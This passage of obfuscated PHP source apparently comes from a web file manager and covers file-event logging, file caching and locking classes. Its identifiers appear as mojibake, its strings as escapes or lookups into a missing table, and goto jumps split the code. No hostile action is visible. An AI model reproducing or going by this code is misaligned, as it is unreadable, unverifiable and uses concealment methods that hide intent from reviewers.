($‡ª†Ø˘Ï[0] == $Å≤ºÀª¶[240] && count($‡ª†Ø˘Ï) > $ˆÔ¨ÈâÊ) { $Ûﬂá´˚¸ = array_slice($‡ª†Ø˘Ï, $ˆÔ¨ÈâÊ); $áπú¶ÀÕ = array_merge($áπú¶ÀÕ, array_reverse($Ûﬂá´˚¸)); } $·–Ã„‰Ò = array_merge($·–Ã„‰Ò, $áπú¶ÀÕ); } $⁄Áã™ò≈[$‹õŸáû‹] = array_unique($·–Ã„‰Ò); return $⁄Áã™ò≈[$‹õŸáû‹]; } public function authTargetInfoMake($äª√å‚Ï) { $˛Æ‹‡úñ =& $_SERVER[ˆë€Ï⁄∂]; $œ¥Ó…˙œ = array(); $¢Á≈Øæõ = array(); foreach ($äª√å‚Ï as $û’‹¬èó) { if ($û’‹¬èó[$˛Æ‹‡úñ[200]] == SourceModel::TYPE_USER) { $œ¥Ó…˙œ[] = intval($û’‹¬èó[$˛Æ‹‡úñ[580]]); } else { if ($û’‹¬èó[$˛Æ‹‡úñ[200]] == SourceModel::TYPE_GROUP) { $¢Á≈Øæõ[] = intval($û’‹¬èó[$˛Æ‹‡úñ[580]]); } } } if ($œ¥Ó…˙œ) { $œ¥Ó…˙œ = Model($˛Æ‹‡úñ[588])->userListInfo($œ¥Ó…˙œ); } if ($¢Á≈Øæõ) { $ﬁ⁄ –ä’ = array($˛Æ‹‡úñ[2080] => array($˛Æ‹‡úñ[503], $¢Á≈Øæõ)); $¢Á≈Øæõ = Model($˛Æ‹‡úñ[596])->field($˛Æ‹‡úñ[2213])->where($ﬁ⁄ –ä’)->select(); $¢Á≈Øæõ = array_to_keyvalue($¢Á≈Øæõ, $˛Æ‹‡úñ[1988]); } return array($˛Æ‹‡úñ[2214] => $œ¥Ó…˙œ, $˛Æ‹‡úñ[2215] => $¢Á≈Øæõ); } public function authInfo($äòãË¢Ò) { $ÌÔ∫Ú∏√ =& $_SERVER[ˆë€Ï⁄∂]; if ($äòãË¢Ò[$ÌÔ∫Ú∏√[2096]]) { $ô⁄©‘Í• = Model($ÌÔ∫Ú∏√[582])->listData($äòãË¢Ò[$ÌÔ∫Ú∏√[2096]]); if (!$ô⁄©‘Í•) { return !1; $Îèª‰–µ = Model($ÌÔ∫Ú∏√[582])->listData(); $’˙ô∆ìÚ = array_filter_by_field($Îèª‰–µ, $ÌÔ∫Ú∏√[498], $ÌÔ∫Ú∏√[240]); return $’˙ô∆ìÚ; } $¢€ﬂÃö» = array_field_key($ô⁄©‘Í•, array($ÌÔ∫Ú∏√[486], $ÌÔ∫Ú∏√[32], $ÌÔ∫Ú∏√[498], $ÌÔ∫Ú∏√[2011], $ÌÔ∫Ú∏√[2012])); $¢€ﬂÃö»[$ÌÔ∫Ú∏√[2216]] = $äòãË¢Ò; return $¢€ﬂÃö»; } else { return array($ÌÔ∫Ú∏√[504] => 0, $ÌÔ∫Ú∏√[1994] => $äòãË¢Ò[$ÌÔ∫Ú∏√[2160]], $ÌÔ∫Ú∏√[505] => $ÌÔ∫Ú∏√[12], $ÌÔ∫Ú∏√[2011] => $ÌÔ∫Ú∏√[2217]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\x72\x63\145\137\145\166\x65\x6e\x74"; protected $dataAuto = array(array("\x63\162\145\141\x74\x65\124\151\x6d\x65", "\164\x69\x6d\x65", "\x69\156\163\145\x72\x74", "\146\x75\x6e\143\x74\151\x6f\x6e"), array("\144\x65\x73\143", '', "\x69\156\163\x65\162\x74\54\x75\x70\x64\x61\x74\x65\x2c\x73\x65\154\145\x63\x74", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Øè›Àª◊, $Àí≥¥å, $¢¢ ≤Ò = '') { $˛Ìî∞¥  =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->eventSave) { return; } $‰Ò˛≥ª— = Model($˛Ìî∞¥ [1436])->sourceInfo($Øè›Àª◊); if (!$‰Ò˛≥ª—) { return !1; } if ($this->isDisableEvent($‰Ò˛≥ª—, $Àí≥¥å)) { return; } if ($¢¢ ≤Ò && is_string($¢¢ ≤Ò)) { $¢¢ ≤Ò = array($˛Ìî∞¥ [2027] => $¢¢ ≤Ò); } $”—ÃÙ¡¢ = defined($˛Ìî∞¥ [2218]) ? USER_ID : 0; $±·ë—◊â = array($˛Ìî∞¥ [502] => $Øè›Àª◊, $˛Ìî∞¥ [2219] => $‰Ò˛≥ª—[$˛Ìî∞¥ [202]], $˛Ìî∞¥ [2220] => $‰Ò˛≥ª—[$˛Ìî∞¥ [32]], $˛Ìî∞¥ [593] => !empty($‰Ò˛≥ª—[$˛Ìî∞¥ [593]]) ? $‰Ò˛≥ª—[$˛Ìî∞¥ [593]] : $˛Ìî∞¥ [12], $˛Ìî∞¥ [1778] => $”—ÃÙ¡¢, $˛Ìî∞¥ [507] => $Àí≥¥å, $˛Ìî∞¥ [1780] => $¢¢ ≤Ò); $this->addSystemLog($Àí≥¥å, $±·ë—◊â); unset($±·ë—◊â[$˛Ìî∞¥ [2220]], $±·ë—◊â[$˛Ìî∞¥ [593]]); return $this->add($±·ë—◊â); } private function addSystemLog($ŒÍÙç¥¶, $Ñ⁄˚¸≈˙) { $∑∂ê¡´⁄ =& $_SERVER[ˆë€Ï⁄∂]; if ($ŒÍÙç¥¶ == $∑∂ê¡´⁄[2221]) { $ŒÍÙç¥¶ = $Ñ⁄˚¸≈˙[$∑∂ê¡´⁄[537]][$∑∂ê¡´⁄[2222]]; } else { if (in_array($ŒÍÙç¥¶, array($∑∂ê¡´⁄[1967], $∑∂ê¡´⁄[2223]))) { $ŒÍÙç¥¶ = $Ñ⁄˚¸≈˙[$∑∂ê¡´⁄[537]][$∑∂ê¡´⁄[181]]; } } $ò“‡ûÆÙ = array_merge($Ñ⁄˚¸≈˙, array($∑∂ê¡´⁄[2224] => $Ñ⁄˚¸≈˙[$∑∂ê¡´⁄[203]], $∑∂ê¡´⁄[2225] => $Ñ⁄˚¸≈˙[$∑∂ê¡´⁄[2225]])); Hook::trigger($∑∂ê¡´⁄[2226], $∑∂ê¡´⁄[2227] . $ŒÍÙç¥¶, $Ñ⁄˚¸≈˙); Model($∑∂ê¡´⁄[1931])->addLog($∑∂ê¡´⁄[2227] . $ŒÍÙç¥¶, $ò“‡ûÆÙ); } private function isDisableEvent($ÕÍﬂÙ˚, $¡â‡ÅµΩ) { $Ó¸È‡ç˚ =& $_SERVER[ˆë€Ï⁄∂]; if ($ÕÍﬂÙ˚[$Ó¸È‡ç˚[200]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($¡â‡ÅµΩ == $Ó¸È‡ç˚[1956]) { return !1; } return !0; } public function eventCreate($—œ∂Ëîå, $ë›˛¸ﬁ¯) { $√éÃ¢ãÅ =& $_SERVER[ˆë€Ï⁄∂]; $ñÁÑÙΩ∆ = Model($√éÃ¢ãÅ[1436])->sourceInfo($—œ∂Ëîå); $≥í¸≈¯◊ = array($√éÃ¢ãÅ[2222] => $ë›˛¸ﬁ¯, $√éÃ¢ãÅ[32] => $ñÁÑÙΩ∆[$√éÃ¢ãÅ[32]]); return $this->addEvent($—œ∂Ëîå, $√éÃ¢ãÅ[2221], $≥í¸≈¯◊); } public function eventFileEdit($™∆›õò⁄) { $†’∞ÛÄÆ =& $_SERVER[ˆë€Ï⁄∂]; $¨π°ÎáÄ = array($†’∞ÛÄÆ[2228] => $_SERVER[$†’∞ÛÄÆ[2229]], $†’∞ÛÄÆ[2230] => strtolower(ACTION)); if (isset($GLOBALS[$†’∞ÛÄÆ[7]][$†’∞ÛÄÆ[2231]])) { $¨π°ÎáÄ[$†’∞ÛÄÆ[2231]] = $†’∞ÛÄÆ[101]; } return $this->addEvent($™∆›õò⁄, $†’∞ÛÄÆ[1957], $¨π°ÎáÄ); } public function eventRecycle($¢ˆöØ£µ, $Ëäÿè€Ç) { return $this->addEvent($¢ˆöØ£µ, $_SERVER[ˆë€Ï⁄∂][2223], $Ëäÿè€Ç); } private static $_removeLast = ''; public function eventRemove($±„˝‡§á) { $œó“Î‹˙ =& $_SERVER[ˆë€Ï⁄∂]; self::$_removeLast = $±„˝‡§á; $¬æàüÂõ = Model($œó“Î‹˙[1436])->sourceInfo($±„˝‡§á); $ã‰Ö∑í« = array_field_key($¬æàüÂõ, array($œó“Î‹˙[203], $œó“Î‹˙[552], $œó“Î‹˙[516], $œó“Î‹˙[595])); $Òø«èﬁΩ = array($œó“Î‹˙[181] => $¬æàüÂõ[$œó“Î‹˙[32]], $œó“Î‹˙[2230] => ACTION, $œó“Î‹˙[2232] => $ã‰Ö∑í«); return $this->addEvent($¬æàüÂõ[$œó“Î‹˙[202]], $œó“Î‹˙[1956], $Òø«èﬁΩ); } public function eventShare($≠Ö®ÁÇ™, $±√ÏÉúÙ) { return $this->addEvent($≠Ö®ÁÇ™, $_SERVER[ˆë€Ï⁄∂][1967], $±√ÏÉúÙ); } public function eventMove($ÊÜÄ«©˘, $∏ˆ™˙¿ÿ, $ñ¯≤‡ú˘) { $Ü®œÜÂÒ =& $_SERVER[ˆë€Ï⁄∂]; if (self::$_removeLast == $ÊÜÄ«©˘) { return; } $óçùÏì» = Model($Ü®œÜÂÒ[1436]); $èÔ¬Ïƒà = $óçùÏì»->sourceInfo($ÊÜÄ«©˘); $¶µèÛæ = $óçùÏì»->sourceInfo($∏ˆ™˙¿ÿ); $ñæÈõûË = $óçùÏì»->sourceInfo($ñ¯≤‡ú˘); $Ä¥¢Å¬≥ = array($Ü®œÜÂÒ[1256] => $∏ˆ™˙¿ÿ, $Ü®œÜÂÒ[2233] => $¶µèÛæ[$Ü®œÜÂÒ[32]], $Ü®œÜÂÒ[2209] => !empty($¶µèÛæ[$Ü®œÜÂÒ[593]]) ? $¶µèÛæ[$Ü®œÜÂÒ[593]] : $Ü®œÜÂÒ[12], $Ü®œÜÂÒ[1257] => $ñ¯≤‡ú˘, $Ü®œÜÂÒ[2234] => $ñæÈõûË[$Ü®œÜÂÒ[32]], $Ü®œÜÂÒ[2235] => !empty($ñæÈõûË[$Ü®œÜÂÒ[593]]) ? $ñæÈõûË[$Ü®œÜÂÒ[593]] : $Ü®œÜÂÒ[12]); $this->addEvent($ÊÜÄ«©˘, $Ü®œÜÂÒ[634], $Ä¥¢Å¬≥); $èÔ¬Ïƒà = $óçùÏì»->sourceInfo($ÊÜÄ«©˘); $Ä¥¢Å¬≥ = array($Ü®œÜÂÒ[203] => $èÔ¬Ïƒà[$Ü®œÜÂÒ[203]], $Ü®œÜÂÒ[32] => $èÔ¬Ïƒà[$Ü®œÜÂÒ[32]]); $this->addEvent($∏ˆ™˙¿ÿ, $Ü®œÜÂÒ[2236], $Ä¥¢Å¬≥); } public function eventCopy($÷êê•Ç›) { $this->eventCreate($÷êê•Ç›, $_SERVER[ˆë€Ï⁄∂][632]); } public function eventRename($ê›´Ó≥”, $∏Æ∆ìˆ√, $ËÕñŒ») { $èíÔÅ∏¡ =& $_SERVER[ˆë€Ï⁄∂]; $ô™Ú¥™ò = array($èíÔÅ∏¡[1256] => $∏Æ∆ìˆ√, $èíÔÅ∏¡[1257] => $ËÕñŒ»); return $this->addEvent($ê›´Ó≥”, $èíÔÅ∏¡[1450], $ô™Ú¥™ò); } public function eventAddComment($ÑÇ¿…ÿï, $¯ª»„ß•) { return $this->addEvent($ÑÇ¿…ÿï, $_SERVER[ˆë€Ï⁄∂][2237], $¯ª»„ß•); } public function eventAddDesc($Úº¢ˆØ·, $ñàÃ™≈‘) { return $this->addEvent($Úº¢ˆØ·, $_SERVER[ˆë€Ï⁄∂][2238], $ñàÃ™≈‘); } public function listBySource($µ≥ÂÃÍÿ) { $√Âò∏‹˘ =& $_SERVER[ˆë€Ï⁄∂]; $≤õÉÎÆ” = Model($√Âò∏‹˘[1436])->sourceInfo($µ≥ÂÃÍÿ); $ﬂà‘Ú…Ù = array($√Âò∏‹˘[502] => $µ≥ÂÃÍÿ); if ($≤õÉÎÆ”[$√Âò∏‹˘[496]] == $√Âò∏‹˘[101]) { $‘ªõ¶Í∫ = Model($√Âò∏‹˘[1436])->listSearchChildren($µ≥ÂÃÍÿ, 20000); $‘ªõ¶Í∫[] = $µ≥ÂÃÍÿ . $√Âò∏‹˘[465]; $ﬂà‘Ú…Ù = array($√Âò∏‹˘[203] => array($√Âò∏‹˘[7], $‘ªõ¶Í∫)); } $Û˜Á€ıö = $this->where($ﬂà‘Ú…Ù)->order($√Âò∏‹˘[2239])->selectPage(); if ($Û˜Á€ıö[$√Âò∏‹˘[453]][$√Âò∏‹˘[454]] == 0) { $Û˜Á€ıö[$√Âò∏‹˘[453]][$√Âò∏‹˘[454]] = 1; $Û˜Á€ıö[$√Âò∏‹˘[456]] = array(array($√Âò∏‹˘[502] => $µ≥ÂÃÍÿ, $√Âò∏‹˘[2219] => $≤õÉÎÆ”[$√Âò∏‹˘[202]], $√Âò∏‹˘[1778] => $≤õÉÎÆ”[$√Âò∏‹˘[538]], $√Âò∏‹˘[507] => $√Âò∏‹˘[2240], $√Âò∏‹˘[508] => $≤õÉÎÆ”[$√Âò∏‹˘[243]], $√Âò∏‹˘[1780] => $√Âò∏‹˘[12])); } return $this->eventListParse($Û˜Á€ıö, $µ≥ÂÃÍÿ); } private function eventListParse($ö‡Ôà‘£, $Ú˝ÔßŒ˚) { $’’Æ¢È˚ =& $_SERVER[ˆë€Ï⁄∂]; $ˆ∆∏”◊„ = $ö‡Ôà‘£[$’’Æ¢È˚[456]]; $¬Úëﬁ»§ = array_to_keyvalue($ˆ∆∏”◊„, $’’Æ¢È˚[12], $’’Æ¢È˚[203]); $â≈Î”«© = array_to_keyvalue($ˆ∆∏”◊„, $’’Æ¢È˚[12], $’’Æ¢È˚[2225]); foreach ($ˆ∆∏”◊„ as $ëøûÖÃ) { $’√«Ì¶ﬂ = $ëøûÖÃ[$’’Æ¢È˚[537]]; if ($ëøûÖÃ[$’’Æ¢È˚[33]] == $’’Æ¢È˚[634] && isset($’√«Ì¶ﬂ[$’’Æ¢È˚[1256]])) { $¬Úëﬁ»§[] = $’√«Ì¶ﬂ[$’’Æ¢È˚[1256]] . $’’Æ¢È˚[12]; $¬Úëﬁ»§[] = $’√«Ì¶ﬂ[$’’Æ¢È˚[1257]] . $’’Æ¢È˚[12]; } if ($ëøûÖÃ[$’’Æ¢È˚[33]] == $’’Æ¢È˚[2236] && isset($’√«Ì¶ﬂ[$’’Æ¢È˚[203]])) { $¬Úëﬁ»§[] = $’√«Ì¶ﬂ[$’’Æ¢È˚[203]] . $’’Æ¢È˚[12]; } } $¬Úëﬁ»§ = array_merge($¬Úëﬁ»§, $â≈Î”«©, array($Ú˝ÔßŒ˚ . $’’Æ¢È˚[12])); $¬Úëﬁ»§ = array_unique($¬Úëﬁ»§); $…ñ∏âÃ¯ = array_unique(array_to_keyvalue($ˆ∆∏”◊„, $’’Æ¢È˚[12], $’’Æ¢È˚[1787])); $ú˘ûü˜ä = Model($’’Æ¢È˚[608])->userListInfo($…ñ∏âÃ¯); $ÂˆÑøÙ» = Model($’’Æ¢È˚[916])->sourceListInfo($¬Úëﬁ»§, !0); foreach ($ˆ∆∏”◊„ as &$ëøûÖÃ) { if ($ëøûÖÃ[$’’Æ¢È˚[33]] == $’’Æ¢È˚[634] && isset($ëøûÖÃ[$’’Æ¢È˚[537]][$’’Æ¢È˚[1256]])) { $ëøûÖÃ[$’’Æ¢È˚[537]][$’’Æ¢È˚[1256]] = $ÂˆÑøÙ»[$ëøûÖÃ[$’’Æ¢È˚[537]][$’’Æ¢È˚[1256]]]; $ëøûÖÃ[$’’Æ¢È˚[537]][$’’Æ¢È˚[1257]] = $ÂˆÑøÙ»[$ëøûÖÃ[$’’Æ¢È˚[537]][$’’Æ¢È˚[1257]]]; } if ($ëøûÖÃ[$’’Æ¢È˚[33]] == $’’Æ¢È˚[2236] && isset($ëøûÖÃ[$’’Æ¢È˚[537]][$’’Æ¢È˚[203]])) { $ëøûÖÃ[$’’Æ¢È˚[537]][$’’Æ¢È˚[203]] = $ÂˆÑøÙ»[$ëøûÖÃ[$’’Æ¢È˚[537]][$’’Æ¢È˚[203]]]; } $ëøûÖÃ[$’’Æ¢È˚[100]] = $ÂˆÑøÙ»[$ëøûÖÃ[$’’Æ¢È˚[203]]]; $ëøûÖÃ[$’’Æ¢È˚[2241]] = $ÂˆÑøÙ»[$ëøûÖÃ[$’’Æ¢È˚[2225]]]; if ($ëøûÖÃ[$’’Æ¢È˚[33]] == $’’Æ¢È˚[1956]) { $ëøûÖÃ[$’’Æ¢È˚[2241]] = $ëøûÖÃ[$’’Æ¢È˚[100]]; $ëøûÖÃ[$’’Æ¢È˚[2225]] = $ëøûÖÃ[$’’Æ¢È˚[2241]][$’’Æ¢È˚[203]]; $ëøûÖÃ[$’’Æ¢È˚[100]] = !1; $ëøûÖÃ[$’’Æ¢È˚[203]] = $’’Æ¢È˚[12]; } $ëøûÖÃ[$’’Æ¢È˚[2168]] = $ú˘ûü˜ä[$ëøûÖÃ[$’’Æ¢È˚[1787]]]; } unset($ëøûÖÃ); $ö‡Ôà‘£[$’’Æ¢È˚[456]] = $ˆ∆∏”◊„; return $ö‡Ôà‘£; } public function removeBySource($ÁË˜üã†) { $Ùê≥É° = array($_SERVER[ˆë€Ï⁄∂][502] => $ÁË˜üã†); $this->where($Ùê≥É°)->remove(); } } goto cÉ‚åËﬁÇº; b¡ﬂé†Ç‘ã: function binCheckBigger($∑¢ﬁØ±‰, $≥Ä∞∂ÛÖ) { return $∑¢ﬁØ±‰ > $≥Ä∞∂ÛÖ; } $_SERVER[$_SERVER[˘„˚ˆ˛–][3]] = (base64_decode('ODYwNg==')."\60\62")+0;$_xgvp="m10j7fiukl4ev3za2xgsy6wqod9npb8r5chtideufcsk7wnylq96j31vz24t0pbxm5roh8g";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ÿπ´æé”, $˛ùø…‚ô) { $¥æ·—‹« =& $_SERVER[ˆë€Ï⁄∂]; if (isset(self::$_methodList[$ÿπ´æé”])) { return @call_user_func_array(self::$_methodList[$ÿπ´æé”], $˛ùø…‚ô); } else { if (method_exists($this, $ÿπ´æé”)) { return call_user_func_array(array($this, $ÿπ´æé”), $˛ùø…‚ô); } else { think_exception(__CLASS__ . $¥æ·—‹«[4] . $ÿπ´æé” . $¥æ·—‹«[5]); } } } public static function __callStatic($÷û∏œï√, $Œ∂ˆ‡Âﬁ) { if (isset(self::$_methodListStatic[$÷û∏œï√])) { return call_user_func_array(self::$_methodListStatic[$÷û∏œï√], $Œ∂ˆ‡Âﬁ); } else { if (method_exists(self, $÷û∏œï√)) { return call_user_func_array(array(self, $÷û∏œï√), $Œ∂ˆ‡Âﬁ); } else { show_json("{$÷û∏œï√}\50\51\x20\x6e\x6f\x74\x20\145\170\x69\163\164\x3b", !1); } } } public static function addMethod($‘ùâû›´, $ª˙Ÿ´πá) { self::$_methodList[$‘ùâû›´] = $ª˙Ÿ´πá; } public static function addMethodStatic($≈≤¡ÊÕƒ, $•∏˘Ç÷‘) { self::$_methodListStatic[$≈≤¡ÊÕƒ] = $•∏˘Ç÷‘; } } goto A¶ª›’æ‹è; d´ïëêÒÿ¬: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($£µ¥ÕØç, $Æ—´å≠Û) { $›≈‘Â‡ú =& $_SERVER[ˆë€Ï⁄∂]; $this->cachePath = $£µ¥ÕØç[$›≈‘Â‡ú[97]]; $this->prefix = $›≈‘Â‡ú[926]; $this->cacheTime = $Æ—´å≠Û; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ûüƒö„˝) { $ÕµÉ¨Åƒ =& $_SERVER[ˆë€Ï⁄∂]; $ûüƒö„˝ = str_replace(array($ÕµÉ¨Åƒ[927], $ÕµÉ¨Åƒ[110], $ÕµÉ¨Åƒ[86]), $ÕµÉ¨Åƒ[928], $ûüƒö„˝); return $this->cachePath . $ÕµÉ¨Åƒ[929] . $ûüƒö„˝ . $ÕµÉ¨Åƒ[930]; } public function set($ÜØò„Õﬁ, $Äã∆‘Ñ◊, $·óõı£• = false) { $·óõı£• = $·óõı£• ? $·óõı£• : $this->cacheTime; $é¸˝¸ì„ = $this->getFile($ÜØò„Õﬁ); if (file_put_contents($é¸˝¸ì„, $this->prefix . $Äã∆‘Ñ◊, LOCK_EX)) { @touch($é¸˝¸ì„, intval(time() + $·óõı£•)); clearstatcache(); return !0; } @unlink($é¸˝¸ì„); return !1; } public function get($æœ„óô) { $◊›Î‰†ß = $this->getFile($æœ„óô); if (file_exists($◊›Î‰†ß) && filemtime($◊›Î‰†ß) < time()) { @unlink($◊›Î‰†ß); return !1; } $º•Ú˚—µ = @file_get_contents($◊›Î‰†ß); return substr($º•Ú˚—µ, strlen($this->prefix)); } public function remove($êå˘’Ÿú) { $Ä∆ôÓ÷¿ = $this->getFile($êå˘’Ÿú); return @unlink($Ä∆ôÓ÷¿); } public function deleteAll() { $é¶±ÄÓ =& $_SERVER[ˆë€Ï⁄∂]; $çΩ”…Èπ = scandir($this->cachePath); foreach ($çΩ”…Èπ as $îó≠‘óœ) { $∏Ç¶∫≤ç = $this->cachePath . $îó≠‘óœ; if (strpos($∏Ç¶∫≤ç, $é¶±ÄÓ[930]) && strpos($∏Ç¶∫≤ç, $é¶±ÄÓ[931])) { @unlink($∏Ç¶∫≤ç); } } } public function clearTimeout() { $°°’É‹¨ =& $_SERVER[ˆë€Ï⁄∂]; $õ‘áÉ ì = scandir($this->cachePath); foreach ($õ‘áÉ ì as $àÒä≥˝Ô) { $÷˙Ÿ«˚‹ = $this->cachePath . $àÒä≥˝Ô; if (strpos($÷˙Ÿ«˚‹, $°°’É‹¨[930]) && strpos($÷˙Ÿ«˚‹, $°°’É‹¨[931]) && filemtime($÷˙Ÿ«˚‹) < time()) { @unlink($÷˙Ÿ«˚‹); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Êÿ≥‘ª– =& $_SERVER[ˆë€Ï⁄∂]; if (self::$handle) { return self::$handle; } $÷êª‡≤Ø = $GLOBALS[$Êÿ≥‘ª–[6]][$Êÿ≥‘ª–[435]]; self::$timeout = $÷êª‡≤Ø[$Êÿ≥‘ª–[932]] ? $÷êª‡≤Ø[$Êÿ≥‘ª–[932]] : 10; $ñŒÜ…¥≤ = _get($GLOBALS[$Êÿ≥‘ª–[6]], $Êÿ≥‘ª–[933]); $õ“Ï™Ú» = $÷êª‡≤Ø[$Êÿ≥‘ª–[918]] ? $÷êª‡≤Ø[$Êÿ≥‘ª–[918]] : $Êÿ≥‘ª–[242]; if ($õ“Ï™Ú» == $Êÿ≥‘ª–[21] && $ñŒÜ…¥≤ == $Êÿ≥‘ª–[13]) { $õ“Ï™Ú» = $Êÿ≥‘ª–[242]; } switch ($õ“Ï™Ú») { case $Êÿ≥‘ª–[921]: self::$handle = new CacheLockRedis(); break; case $Êÿ≥‘ª–[922]: self::$handle = new CacheLockMemcached(); break; case $Êÿ≥‘ª–[21]: self::$handle = new CacheLockDatabase(); break; case $Êÿ≥‘ª–[242]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Êÿ≥‘ª–[934], $Êÿ≥‘ª–[935]); } return self::$handle; } private static function key($‰–ñÃã¡) { return $_SERVER[ˆë€Ï⁄∂][936] . Cache::key($‰–ñÃã¡); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($÷—ûﬂÀÎ = '') { self::$errorMsg = $÷—ûﬂÀÎ; } public static function lockGlobal($Íõ»¢°å, $πàïãÅ“) { return self::lock($Íõ»¢°å, $πàïãÅ“, !0); } public static function lock($Ê∞¢√öË, $™¨≤∑ÆŸ = false, $‘‚Éùì = false) { $ÖÒ∑àÌ„ =& $_SERVER[ˆë€Ï⁄∂]; $±ﬂ…∑Í„ = self::init(); $‘ ºÈı∏ = self::key($Ê∞¢√öË); $™¨≤∑ÆŸ = $™¨≤∑ÆŸ ? $™¨≤∑ÆŸ : self::$timeout; $Ôúüôπ– = timeFloat(); if ($GLOBALS[$ÖÒ∑àÌ„[937]]) { if (!$±ﬂ…∑Í„->lock($‘ ºÈı∏, 0.2)) { die; } return !0; } $¿ÙÎ•√´ = $±ﬂ…∑Í„->lock($‘ ºÈı∏, $™¨≤∑ÆŸ); $´·ΩÉäÓ = timeFloat(); if (!$¿ÙÎ•√´) { $Ñ˜◊º∞± = "\x6c\157\x63\153\40\x65\x72\x72\x6f\162\73\x6b\145\171\75{$Ê∞¢√öË}\73\x74\x69\x6d\x65\75{$™¨≤∑ÆŸ}\73" . self::$errorMsg . $ÖÒ∑àÌ„[84] . get_caller_msg(); $üøŸ‡ Ú = LNG($ÖÒ∑àÌ„[938]) . "\x28{$™¨≤∑ÆŸ}\163\x29\56" . LNG($ÖÒ∑àÌ„[939]); $üøŸ‡ Ú .= $ÖÒ∑àÌ„[940]; if (is_string(self::$errorMsg) && self::$errorMsg) { $üøŸ‡ Ú = $üøŸ‡ Ú . $ÖÒ∑àÌ„[941] . self::$errorMsg; } write_log($ÖÒ∑àÌ„[942] . sprintf($ÖÒ∑àÌ„[943], timeFloat() - $Ôúüôπ–) . $ÖÒ∑àÌ„[944] . $Ñ˜◊º∞± . $ÖÒ∑àÌ„[945] . json_encode(error_get_last()), $ÖÒ∑àÌ„[935]); show_json($üøŸ‡ Ú, !1); } if (!$‘‚Éùì) { self::$lockItem[$‘ ºÈı∏] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ë•˛◊⁄Ì = number_format(timeFloat() - $´·ΩÉäÓ, 3); write_log($ÖÒ∑àÌ„[946] . $Ê∞¢√öË . $ÖÒ∑àÌ„[947] . $ë•˛◊⁄Ì, $ÖÒ∑àÌ„[935]); } return $¿ÙÎ•√´; } public static function lockGet($«”ûèÔß) { $Ôíã—€© = self::key($«”ûèÔß); if (self::$lockItem[$Ôíã—€©]) { return self::$lockItem[$Ôíã—€©]; } return self::init()->lockGet($Ôíã—€©); } public static function unlock($„•†Åîƒ) { $ñÒ˙≠Ø„ =& $_SERVER[ˆë€Ï⁄∂]; $«ÊÇãÈ = self::key($„•†Åîƒ); self::$lockItem[$«ÊÇãÈ] = null; self::init()->unlock($«ÊÇãÈ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ñÒ˙≠Ø„[948] . $„•†Åîƒ, $ñÒ˙≠Ø„[935]); } return; } public static function unlockRuntime() { $ß±“Îœ« =& $_SERVER[ˆë€Ï⁄∂]; $“∂˜ëÁä = self::init(); $Ÿò’—™ƒ = !1; foreach (self::$lockItem as $ƒÙªÆÊé => $û·ëíÌ») { if (!$û·ëíÌ») { continue; } $“∂˜ëÁä->unlock($ƒÙªÆÊé); if (!$Ÿò’—™ƒ) { $Ÿò’—™ƒ = !0; write_log($ß±“Îœ«[949] . $ƒÙªÆÊé . $ß±“Îœ«[84] . get_caller_msg(), $ß±“Îœ«[935]); continue; } write_log($ß±“Îœ«[949] . $ƒÙªÆÊé, $ß±“Îœ«[935]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Ÿ÷æÛ‚· = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ß±“Îœ«[950] . $Ÿ÷æÛ‚· . $ß±“Îœ«[951] . ACTION, $ß±“Îœ«[935]); } } public static function fileLock($Ôö´π™á) { $Ê„»ØÄŒ =& $_SERVER[ˆë€Ï⁄∂]; if (!$GLOBALS[$Ê„»ØÄŒ[952]]) { $GLOBALS[$Ê„»ØÄŒ[952]] = array(); } $GLOBALS[$Ê„»ØÄŒ[952]][$Ôö´π™á] = !1; $∑Û”äù≠ = fopen(DATA_PATH . $Ôö´π™á . $Ê„»ØÄŒ[953], $Ê„»ØÄŒ[954]); if (!$∑Û”äù≠) { return !1; } $GLOBALS[$Ê„»ØÄŒ[952]][$Ôö´π™á] = $∑Û”äù≠; if (flock($∑Û”äù≠, LOCK_EX)) { return !0; } self::unlock($Ôö´π™á); show_json($Ê„»ØÄŒ[955], !1); return !1; } public static function fileUnlock($Œ™–Â§÷) { $—√´éç¡ =& $_SERVER[ˆë€Ï⁄∂]; $çá÷®õ« = $GLOBALS[$—√´éç¡[952]][$Œ™–Â§÷]; if (!$çá÷®õ«) { return; } $GLOBALS[$—√´éç¡[952]][$Œ™–Â§÷] = !1; flock($çá÷®õ«, LOCK_UN); fclose($çá÷®õ«); } public static function fileUnlockAll() { $ÌíñÊâó =& $_SERVER[ˆë€Ï⁄∂]; if (!isset($GLOBALS[$ÌíñÊâó[952]]) || !$GLOBALS[$ÌíñÊâó[952]]) { return; } foreach ($GLOBALS[$ÌíñÊâó[952]] as $‰Æ÷Ò¬õ => $èúÏ˙í’) { if (!$èúÏ˙í’) { continue; } $GLOBALS[$ÌíñÊâó[952]][$‰Æ÷Ò¬õ] = !1; flock($èúÏ˙í’, LOCK_UN); fclose($èúÏ˙í’); } $GLOBALS[$ÌíñÊâó[952]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto e®∞ÊË‹ıä; cÉ‚åËﬁÇº: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\165\x72\143\145\x5f\x68\151\x73\x74\x6f\x72\171"; public function historyCount($Ú–üÇ‰ƒ) { $ªû÷ˆ∫¥ =& $_SERVER[ˆë€Ï⁄∂]; if (!$Ú–üÇ‰ƒ) { return array(); } if (is_string($Ú–üÇ‰ƒ) || is_int($Ú–üÇ‰ƒ)) { $Ú–üÇ‰ƒ = array($Ú–üÇ‰ƒ); } 